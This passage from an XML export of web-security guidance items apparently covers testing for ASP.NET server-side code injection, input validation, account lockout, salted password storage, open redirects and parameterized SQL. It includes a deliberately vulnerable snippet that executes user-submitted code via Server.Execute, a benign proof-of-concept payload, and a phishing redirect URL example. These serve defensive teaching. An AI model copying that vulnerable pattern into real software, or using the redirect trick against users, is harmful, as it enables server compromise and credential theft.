&lt;pre&gt;&amp;lt;%&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; If Not Request(&amp;quot;Code&amp;quot;) = Nothing Then&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Dim fso, f&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 'User input Code is written to a file named input.aspx&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; fso = CreateObject(&amp;quot;Scripting.FileSystemObject&amp;quot;)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; f = fso.OpenTextFile(Server.MapPath(&amp;quot;input.aspx&amp;quot;), 8, True)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; f.Write(Request(&amp;quot;Code&amp;quot;) &amp;amp; vbCrLf)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; f.close()&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; f = Nothing&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; fso = Nothing&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 'input.aspx is executed&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;strong&gt;Server.Execute(&amp;quot;input.aspx&amp;quot;)&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Else&lt;br&gt;%&amp;gt;&lt;br&gt;&amp;lt;form&amp;gt;&lt;br&gt;&amp;lt;input name=&amp;quot;Code&amp;quot; size=&amp;quot;100px&amp;quot; /&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;Enter code&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;%&lt;br&gt;End If&lt;br&gt;%&amp;gt;&lt;br&gt;&lt;br&gt;&lt;/pre&gt;
&lt;p&gt;The application dynamically evaluates the input data entered in the &lt;em&gt;Code&lt;/em&gt; web form parameter.&amp;nbsp; As a result, an attacker can pass malicious code that will be executed by the application at the server-side.&lt;/p&gt;
&lt;p&gt;In detail:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The attacker discovers an application functionality where client supplied input is dynamically evaluated and executed.
&lt;/li&gt;&lt;li&gt;The attacker passes malicious code as input so that the application executes it at the server-side.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2: Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;The following step in learning how to test for server-side code injection bugs is to understand what causes this attack and how to protect against it.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;Server-side code injection in ASP .NET applications is possible due to dynamic code evaluation vulnerabilities.&amp;nbsp; A dynamic code evaluation vulnerability occurs when the application uses client-supplied input for code evaluation and execution without doing
 proper input validation and sanitization.&amp;nbsp;&amp;nbsp; For example, in the previous scenario the application blindly constructs an input text file and, without checking for malicious code, invokes the
&lt;em&gt;Server.Execute&lt;/em&gt; function to evaluate and execute the newly created text file.&lt;/p&gt;
&lt;p&gt;To protect against this bug, ASP .NET must properly validate any data before using it for dynamic evaluation such as when executing functions of the
&lt;em&gt;Server.Execute&lt;/em&gt; family.&amp;nbsp; &amp;nbsp;&amp;nbsp;Developers are encouraged to create a &lt;em&gt;white list
&lt;/em&gt;containing a list of the valid data and code constructs.&amp;nbsp; The application must then check that all parameters used in the dynamic evaluation appear in the white list and reject any input data that is not white-listed.&lt;/p&gt;
&lt;p&gt;&lt;br&gt;
&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3: Execute Test Cases&lt;/h1&gt;
&lt;p&gt;Now that you’ve reviewed the theoretical aspects of server-side code injection bugs in ASP .NET it is necessary to execute the necessary test cases to check if your application is vulnerable.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for Server-side code injection in ASP .NET&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Discover a functionality in the application that performs dynamic code evaluation based on client supplied input.
&lt;/li&gt;&lt;li&gt;Pass a small proof-of-concept ASP .NET code as input such as:
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;&amp;lt;% Response.Write(&amp;quot;Application is vulnerable&amp;quot;) %&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;Observe how the application reacts to the injected code.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results:&amp;nbsp; The application is vulnerable if it evaluates and executes the code passed in step 2 and displays the message
&lt;em&gt;Application is vulnerable.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Server-side code injection bugs allow attackers to inject code that will be executed by the ASP .NET engine that hosts the vulnerable application.&amp;nbsp;&amp;nbsp; Attackers can use server-side code injection to execute logical attacks on the target application.&amp;nbsp; To learn
 how to test for this vulnerability it is necessary to understand its attack scenario and how it is possible in ASP .NET applications, as well as how to protect against it.&amp;nbsp; Testing for this bug requires passing a small proof-of-concept code as input to the
 application under test while observing how the application reacts.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>00c5fcad-6dc3-4362-bfa3-a55379abe094</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate All Values Sent from the Client</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Check that your application validates all input parameters, including regular and hidden form fields, query strings, and cookies.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;To protect your application from denial of service attacks and code injection attacks, including SQL injection and XSS.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This is an important guideline and should be followed all the time.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Restrict the fields that the user can enter and modify and validate all values coming from the client. If you have predefined values in your form fields, users can change them and post them back to receive different results. Permit only known good values
 wherever possible. For example, if the input field is for a state, only inputs matching a state postal code should be permitted.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;System.Text.RegularExpressions.Regex&lt;/strong&gt; class helps validate input parameters. For example, the following code shows how to use this class to validate a name passed through a query string parameter. The same technique can be used to validate
 other forms of input parameter, for example, from cookies or form fields. For example, to validate a cookie parameter, use
&lt;strong&gt;Request.Cookies&lt;/strong&gt; instead of &lt;strong&gt;Request.QueryString&lt;/strong&gt;.&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;
&lt;pre&gt;using System.Text.RegularExpressions;&lt;br&gt;. . .&lt;br&gt;private void Page_Load(object sender, System.EventArgs e)&lt;br&gt;{&lt;br&gt;&amp;nbsp; // Name must contain between 1 and 40 alphanumeric characters&lt;br&gt;&amp;nbsp; // together with (optionally) special characters '`´ for names such&lt;br&gt;&amp;nbsp; // as D'Angelo&lt;br&gt;&amp;nbsp; if (!Regex.IsMatch(Request.QueryString[&amp;quot;name&amp;quot;], &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; @&amp;quot;^[a-zA-Z'`-´\s]{1,40}$&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; throw new Exception(&amp;quot;Invalid name parameter&amp;quot;);&lt;br&gt;&amp;nbsp; // Use individual regular expressions to validate all other&lt;br&gt;&amp;nbsp; // query string parameters&lt;br&gt;&amp;nbsp; . . .&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;For more information about using regular expressions and how to validate input data, see &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302426.aspx#c10618429_006"&gt;Input Validation&lt;/a&gt;&amp;quot;.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>04f887c2-3d04-4e9b-99e2-74b18bbd6f2b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Lock Accounts After Consecutive Failed Login Attempts</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Lock users' accounts after consecutive failed login attempts.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Multiple consecutive failed authentication attempts over a short period of time are a symptom that is used to detect when an account is under attack. Locking out the account can prevent&amp;nbsp;an attacker from compromising and accessing the account.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Your application should lock an account if the user has unsuccessfully tried to authenticate multiple times within a small period of time.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to successfully lock accounts after consecutive failed login attempts:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine a lockout policy. &lt;/strong&gt;There are two variables to consider when determining a lockout policy:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Number of allowed consecutive failed login attempts &lt;/li&gt;&lt;li&gt;Amount of time that a locked account will remain locked&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;A simple policy would be to lock an account after&amp;nbsp;five failed login attempts for the duration of 15 minutes. Although this is an effective method for blocking a brute force attack, it exposes your application to denial of service as an attacker can easily
 keep an account locked through a small stream of authentication requests.&lt;br&gt;
&lt;br&gt;
When determining the lockout policy, it is important to evaluate the risk of attacks against the user and the support costs associated with reactivating a locked account. For example, requiring the user to contact your organization's support staff&amp;nbsp;to reactivate
 a locked account will have a direct impact on support costs and would add general user frustration.&amp;nbsp;However, it is important to use extra care when designing more sophisticated variations of your application's lockout policy, such as correlating a single or
 multiple user login attempts with a source IP. When adding extra levels of complexity, carefully consider and evaluate the scenarios where your application's lockout policy can be circumvented or can harm your business. For instance, consider scenarios where
 an attacker would attempt to compromise a user through the use of multiple hosts, or multiple users would authenticate using a shared office IP.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Track login attempts. &lt;/strong&gt;Login attempts can be tracked with the use of a login counter. Increment the counter once a user tries to authenticate. Reset the counter to 0 after the user successfully authenticates. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;-- Authenticate the user&lt;br&gt;sql&amp;gt; select login_attempts from users&lt;br&gt;      where user = {{username}} and pass = {{passDigest}};&lt;br&gt; -- Reset the login counter&lt;br&gt;sql&amp;gt; update users set login_attempts = 0 where user = {{username}};&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enforce the lockout policy. &lt;/strong&gt;The lockout policy should be enforced at all points in the application where authentication is necessary. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String dbStatement = &amp;quot;select login_attempts from users&amp;quot;&lt;br&gt;                   &amp;#43; &amp;quot;where user = ? and pass = ?;&amp;quot;;&lt;br&gt;PreparedStatement st = dbConnection.prepareStatement(dbStatement);&lt;br&gt;st.setString(1, user);st.setString(2, passDigest);&lt;br&gt;ResultSet rs = st.executeQuery();&lt;br&gt; if (rs.first())&lt;br&gt;{      &lt;br&gt;userIsValid = true;&lt;br&gt;      loginCount = rs.getInt(1);&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;      userIsValid = false;&lt;br&gt;}&lt;br&gt; rs.close(); if(userIsValid)&lt;br&gt;{&lt;br&gt;      if(loginCount &amp;gt; 3)&lt;br&gt;      {&lt;br&gt;            throw new AccountIsLockedException();&lt;br&gt;      }&lt;br&gt;       resetLoginAttemptCounter(user);&lt;br&gt;       // The application checks the password's maturity&lt;br&gt;      checkPasswordMaturity(user);&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;      updateLastLoginAttempt(user);&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Set an unlocking mechanism. &lt;/strong&gt;Keep track of the lockout period. Based on your application's lockout policy, unlock the account after the lockout period has expired. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;-- Unlock all locked accounts whose 45 minute lockout period has expired&lt;br&gt;sql&amp;gt; update users set login_attempts = 0&lt;br&gt;      where last_login &amp;lt; (current_timestamp - interval '45' minute);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; PCI DSS requirements state that an account should be locked out for at least 30 minutes after no more than six failed login attempts.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code executes the database transaction that is required during authentication. Because the transaction fails to check the login attempts counter, it is possible for an attacker to compromise an account through the use of brute force or a dictionary
 attack.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;// The application fails to check the number of login attempts&lt;br&gt;String dbStatement = &amp;quot;select user from users where user = ? and pass = ?;&amp;quot;;&lt;br&gt;st = dbConnection.prepareStatement(dbStatement);&lt;br&gt;st.setString(1, user);st.setString(2, passDigest);&lt;br&gt;rs = st.executeQuery();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code executes the database transaction that is required during authentication. Because the transaction checks the login attempts counter, it would be very expensive for an attacker to compromise an account through the use of brute force or
 a dictionary attack.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;// The application checks the number of login attempts&lt;br&gt;String dbStatement = &amp;quot;select login_attempts from users where user = ? and pass = ?;&amp;quot;;&lt;br&gt;PreparedStatement st = dbConnection.prepareStatement(dbStatement);&lt;br&gt;st.setString(1, user);&lt;br&gt;st.setString(2, passDigest);ResultSet rs = st.executeQuery();&lt;br&gt; if (rs.first())&lt;br&gt;{&lt;br&gt;      userIsValid = true;&lt;br&gt;      loginCount = rs.getInt(1);&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;      userIsValid = false;&lt;br&gt;}&lt;br&gt; rs.close();&lt;br&gt; if(userIsValid)&lt;br&gt;{&lt;br&gt;      if(loginCount &amp;gt; 3)&lt;br&gt;      {&lt;br&gt;            throw new AccountIsLockedException();&lt;br&gt;      }&lt;br&gt;      resetLoginAttemptCounter(user);&lt;br&gt;      checkPasswordMaturity(user);&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;      updateLastLoginAttempt(user);&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:E42BF294-03A3-4753-9F12-556CDE2A347D"&gt;Guideline: Enforce Strong Passwords (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8EDBAC9F-BFCF-43DF-A4FA-5BB7E03E7410"&gt;Guideline: Do Not Leave Passwords in Memory (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:7E520F82-948E-4D53-9923-1E219278138F"&gt;Attack: Denial of Service Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6D0F24EA-B130-4AAE-9EDF-0B27F04B3145"&gt;Attack: Credentials Brute Force Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A483E10E-2C4F-4947-863F-81CF93DD5FEA"&gt;Attack: Credentials Dictionary Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A8C4CED5-3F8A-4589-8025-37E6207783D6"&gt;Attack: Account Lockout Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:99EC663A-5CC4-414B-B9C5-8D3E962B47CB"&gt;Checklist Item: Accounts Are Locked After Consecutive Failed Login Attempts (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>06172387-2ef5-4547-a004-3fe3b5d33b87</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Store Only Salted Password Digests, not Plaintext Passwords</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Never store passwords directly in the user store.&amp;nbsp; Instead, store a salted password hash.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By storing your password with hashes and salt, you help prevent an attacker that gains access to your user store from obtaining the user passwords.&amp;nbsp; If you use encryption, you have the added problem of securing the encryption key; hashes are not reversible
 and have no key to be compromised.&amp;nbsp; If your credential store is compromised, the salt value helps to slow an attacker who is attempting to perform a dictionary attack.&amp;nbsp; This gives you additional time to detect and react to the compromise.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All systems which need to store user passwords should store them hashed with salt.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Ideally, use a membership provider configured with hashed password.&amp;nbsp; If you must implement your own user stores, store one-way password hashes with salt.&amp;nbsp; Generate the hash from a combination of the password and a random salt value.&amp;nbsp; Use a strong hashing
 algorithm such as SHA256. &lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on How to configure&amp;nbsp;hashed password&amp;nbsp;for membership providers
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa479048.aspx#bucupro_topic3"&gt;http://msdn2.microsoft.com/en-us/library/aa479048.aspx#bucupro_topic3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>0ad428be-72ab-4438-b6c9-b585f0f54948</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Don't Use Redirects or Forwards if Possible</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Avoid using redirects or forwards if possible.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Redirects or forwards may be manipulated by an attacker to create hyperlinks that appear to point to legitimate sites, but actually point to attacker-controlled malicious pages. This technique is oftened used by phishers to trick people into trusting a fake
 web site.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Perform the following actions to avoid using redirects or forwards:&lt;/p&gt;
&lt;br&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate redirects and forwards.&lt;/strong&gt; Review application code to find all redirects and forwards used by the application.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Review application design.&lt;/strong&gt; Determine how redirects and forwards figure into the application design. Consider making design changes to remove the need for redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Remove redirects or forwards.&lt;/strong&gt; Remove the redirects and forwards that are not necessary after changes to the application design.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Secure the remaining redirects or forwards.&lt;/strong&gt; If there appears to be no reasonable way to get rid of redirects or forwards, use related guidelines to secure the remaining redirects or forwards.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider an on-line banking application that has an insecure redirect:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=[destination]&lt;/pre&gt;
&lt;p&gt;A phisher may create the following hyperlink to point to his own site and send it in spam messages to millions of people:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=www.phisher.com&lt;/pre&gt;
&lt;p&gt;When a user sees a link that appears to point to his bank at onlinebank.com in an e-mail message, he clicks that link and sees a web site that looks exactly like the bank's, but is actually a phishing web site used to steal authentication credentials. The
 user enters his account number and PIN into the web page, receives an error message telling him to try again, and is redirected to the bank's real site. After entering his credentials again, the user successfuly views his account. However, the phisher now
 has the user's online banking information.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The best solution to unvalidated redirects or forwards is to not use redirects or forwards at all. Considering the problem example above, a simple solution would be to remove the redirect.asp page after making the necessary changes to the application design.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:f53c44e4-a08e-437c-a40d-ec3db00baca7"&gt;Calculate Destinations of Redirects and Forwards Without User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:83896e9e-a4cd-434c-980a-276c660984da"&gt;Use Mapping Values When Redirecting on User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33"&gt;Validate Destinations of Redirects and Forwards&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>0ba54c5c-7064-4224-8d6d-b4906db5da59</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use Type Safe SQL Parameters When Constructing SQL Queries</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP&amp;nbsp;that interact with a database.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use Prepared Statements to execute SQL statements. Do not generate SQL statements directly from user input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Parameterized Queries mitigate the number one risk for database-facing Web applications: SQL injection. This powerful attack is language independent, as it depends on the algorithm used to generate SQL strings passed to the database and affects the database
 engine, not the actual application.&lt;/p&gt;
&lt;p&gt;It exploits the creation of the SQL string, in which user input is embedded manually with escape sequences (such as the single quote (&lt;strong&gt;'&lt;/strong&gt;) or double quote (&lt;strong&gt;&amp;quot;&lt;/strong&gt;) characters). Using this method, an attacker inserts valid SQL statement
 fragments as part of user input so they, in turn, are embedded within the SQL query that is submitted to the database engine for execution. Successful exploitation allows an attacker to potentially compromise the entire database and often the underlying operating
 system. &lt;/p&gt;
&lt;p&gt;Parameterized Queries offer a simple yet efficient mitigation since they automatically contain user-input in a non-escaped form, &amp;quot;compiling&amp;quot; the query and passing the input as parameters, much like a function call. There is no known method of injecting custom
 SQL over Parameterized Queries.&lt;/p&gt;
&lt;p&gt;Additionally, using Parameterized queries offers two significant advantages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Greater Efficiency&lt;/strong&gt;: The database engine needs to &amp;quot;compile&amp;quot; the statement only once, allowing for greater efficiency in query invocation.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Greater Security&lt;/strong&gt;: The database engine automatically handles the parsing and embedding of user input, effectively negating any potential for SQL injection due to attackers taking advantage of delimiter characters such as a single quote (&lt;strong&gt;'&lt;/strong&gt;)
 or a double quote (&lt;strong&gt;&amp;quot;&lt;/strong&gt;). &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Type-safe SQL parameters should be used whenever SQL statements need to be executed by the database.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;One way of making the application less susceptible to SQL injection attacks is by using stored procedures. Stored procedures are subroutines stored in the database that are available to applications for accessing the data.
